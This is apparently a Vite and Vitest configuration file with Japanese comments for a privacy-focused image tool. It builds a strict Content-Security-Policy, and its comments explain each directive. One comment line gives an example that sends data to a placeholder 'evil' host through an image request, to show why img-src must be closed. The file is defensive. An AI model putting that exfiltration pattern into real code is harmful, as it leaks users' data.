import { defineConfig, type Plugin } from 'vite';
import { configDefaults } from 'vitest/config';

/**
 * Content-Security-Policy。
 *
 * この作品の中心的な約束は「画像は端末から出ません」で、CSP はそれを
 * 約束からブラウザが強制する事実へ近づけるための一段目である。
 *
 * **`connect-src 'none'` だけでは何も閉じていない。** CSP はディレクティブごとに
 * default-allow なので、`connect-src` を閉じても次の一行がそのまま通る:
 *
 *     new Image().src = 'https://evil/?p=' + data     // img-src の管轄
 *
 * ゆえに `default-src 'none'` を基点に敷き、そこから必要な分だけ開ける。
 * **`img-src` を閉じることが `connect-src 'none'` より重要**である。
 *
 * `base-uri 'none'` は非自明に load-bearing ── 注入された <base href> は全相対 URL を
 * 付け替えるので、これが開いていると `script-src 'self'` が無効化される。
 *
 * `worker-src 'self'` は取り込み worker のため。**Phase 0 では `blob:` も許していた** ──
 * 「vite の worker 出力形式によっては blob: が要るかもしれない」という理由で、
 * つまり**実際に何が出るか確かめないまま**開けていた。Phase 1a-ii で worker を
 * 実装して確かめた結果:
 *
 *   - `new Worker(new URL('./worker.ts', import.meta.url), { type: 'module' })` は
 *     `dist/assets/worker-*.js` という same-origin チャンクになり、blob: を使わない
 *   - CSP を載せたサブパス配信で worker の起動と往復が成功し、violation は 0 件
 *   - `blob:` を必要とするのは `?worker&inline` を選んだときだけで、そちらは採っていない
 *
 * → **`blob:` を落とす。** 使っていない許可は、開けた理由を誰も覚えていない許可になる。
 * (`img-src` の `blob:` は object URL のために残す ── こちらは Phase 1c で実際に使う。)
 *
 * `style-src` の 'unsafe-inline' が唯一の妥協点 ── <noscript> 内の <style> と
 * インライン style 属性のため。ハッシュにすると編集のたびに壊れるので採らない。
 *
 * **CSP が原理的に塞げないもの**(README とアプリ内の声明にも書く):
 *   - トップレベルナビゲーション(`navigate-to` は CSP3 から削除され、どこにも実装がない)
 *   - window.open
 *   - WebRTC データチャネル(`webrtc 'block'` は Chromium のみ)
 * このコードはそのどれも使わないが、「使えない」のではなく「使わない」である。
 *
 * また <meta> の CSP は frame-ancestors / report-uri / sandbox を黙って無視し、
 * GitHub Pages は HTTP ヘッダを設定できない ── 埋め込み可能で、違反テレメトリも無い。
 */
const CSP = [
  "default-src 'none'",
  "script-src 'self'",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: blob:",
  "font-src 'self'",
  "connect-src 'none'",
  "worker-src 'self'",
  "object-src 'none'",
  "media-src 'none'",
  "manifest-src 'none'",
  "form-action 'none'",
  "base-uri 'none'",
  'upgrade-insecure-requests',
].join('; ');

/**
 * 本番ビルドにだけ CSP meta を注入する。
 *
 * dev では HMR が ws: を張るので `connect-src 'none'` と両立しない。ここが罠で、
 * **プライバシー検証を `npm run dev` で行うと「CSP に阻まれた」を一度も観測できないまま
 * 素通りする**。検証は必ず `npm run preview`(:4173) で行うこと ──
 * .claude/launch.json に preview 用の設定を別に置いてあるのはそのため。
 */
function cspPlugin(): Plugin {
  return {
    name: 'lens-csp',
    apply: 'build',
    transformIndexHtml: {
      order: 'post',
      handler: (html) =>
        html.replace(
          '<head>',
          `<head>\n    <meta http-equiv="Content-Security-Policy" content="${CSP}" />`,
        ),
    },
  };
}

export default defineConfig({
  // 相対パス出力: GitHub Pages のサブパス配信(/dimension-lens/)でそのまま動く
  base: './',
  plugins: [cspPlugin()],
  // worker を same-origin の ES チャンクとして出す(blob: に頼らない)
  worker: { format: 'es' },
  /**
   * **repo の中に置かれた git worktree のテストを拾わない**（Phase 2c-x で踏んだ）。
   *
   * vitest の既定 exclude は `node_modules` / `dist` / `.git` などで、
   * `.claude/worktrees/<名前>/` は入っていない。そこに repo の複製が在ると
   * **同じテストが 2 回集められる**（実測: 31 ファイル 447 件 → 62 ファイル 894 件）。
   *
   * これは件数が増えるだけの問題ではない。`scripts/teeth.mjs` は
   * **この repo の `src/` だけを変異させて落ちた件数を数える**ので、
   * 変異していない複製が同じ実行に混ざると、
   * **台帳の `observed` が「変異と無関係な走行」を含む数になる** ──
   * つまり歯の強さの記録が、他人の作業ツリーの状態に依存する。
   *
   * `defaultExclude` に足す形で書く（既定を置き換えると `node_modules` が戻ってくる）。
   */
  test: {
    exclude: [...configDefaults.exclude, '**/.claude/**'],
    /**
     * **既定の 5 秒に預けない**（Phase 2c-x で踏んだ）。
     *
     * vitest はファイルを並列に走らせるので、重いファイル（`fold` / `specimen` /
     * `docLedger` / `widen` はシーンを万回単位で回す）が居るあいだ、
     * 軽いファイルはスケジュールから外れて待つ。実測: `sceneFields.test.ts` の
     * 「mean は全点が画像のリニア平均になる」は**単独では 629 ms** なのに、
     * 全体走行では 5000 ms の既定を超えて落ちた ── **止まっていないのに赤くなる。**
     *
     * これは「壊れていても緑」の逆で、**直っていても赤**である。どちらも
     * 判定が測っているものを取り違えている点で同じ質の欠陥なので、窓を機構へ合わせる。
     * CI の runner はこの Mac より遅いので、そちらでは先に出る。
     *
     * **個々の重いテストには `it(…, 60_000)` を明示してある。** ここが受け持つのは
     * 「軽いはずのテストが混雑で落ちる」ぶんだけである。
     */
    testTimeout: 30_000,
  },
  build: {
    target: 'es2022',
    /**
     * modulepreload ポリフィルを無効にする。
     *
     * これは最適化の話ではなく、**プライバシーの話**である。vite の既定ポリフィルは
     * `fetch(link.href, ...)` で自前チャンクを先読みするコードをバンドルへ撒く ──
     * Phase 0 の 710 バイトのバンドルに、我々が書いていない fetch が 1 個入っていた
     * (privacy.test.ts が最初の実行で捕まえた)。
     *
     * 実害は 2 つ。(1) 「バンドルに通信 API は無い」と言えなくなる。
     * (2) `connect-src 'none'` はこの fetch も塞ぐので、ネイティブ modulepreload を
     * 持たないブラウザでは**ページを開くたびに CSP 違反が発火する** ──
     * securitypolicyviolation を購読して測るプライバシー検証(#6)が、
     * 自分の出したノイズで埋まる。
     *
     * 失うのは Safari 16.4〜16.6 などでの先読みだけで、
     * <script type="module"> によるチャンク読み込み自体は変わらない。
     * この作品は WebGL2 必須なので、対象ブラウザのほとんどはネイティブ対応済み。
     */
    modulePreload: { polyfill: false },
    // three(523KB / gzip 131KB)は exact pin のベンダーチャンク。分離したうえで閾値をその上へ。
    chunkSizeWarningLimit: 600,
    rollupOptions: {
      output: {
        manualChunks: { three: ['three'] },
      },
    },
  },
});
